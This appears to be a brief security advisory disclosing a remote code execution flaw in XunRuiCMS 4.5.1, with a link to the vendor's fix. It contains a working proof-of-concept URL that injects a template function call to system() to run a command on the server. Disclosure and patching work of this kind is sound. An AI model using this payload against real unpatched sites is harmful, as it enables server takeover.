# xunruicms4.5.1-RCE

## Vulnerability title
XunRuicms version 4.5.1 analysis remote code execution

## Affected version
version 4.5.1 or lower

## Discoverer
Jiang

## analysis report
### Vulnerability testing environment
https://www.xunruicms.com/down/

### Vulnerability description
when you use the method of get to commit a evil payload,the code will be executed.

### Vulnerability verification

`http://localhost:2333/index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid= action=function name=system param0=calc`

![1](https://j1ang.oss-cn-hangzhou.aliyuncs.com/img/1.gif)

## Adding
When I contacted the manufacturer, they have fixed this vulnerability, but some users did not update it.
They commit Here.
https://gitee.com/dayrui/xunruicms/commit/80e2d8f3008384d926c64163b7334a260edc0a51

![image](https://user-images.githubusercontent.com/71314272/128168605-9b47c078-4b34-4da0-b40a-947fe3b17829.png)
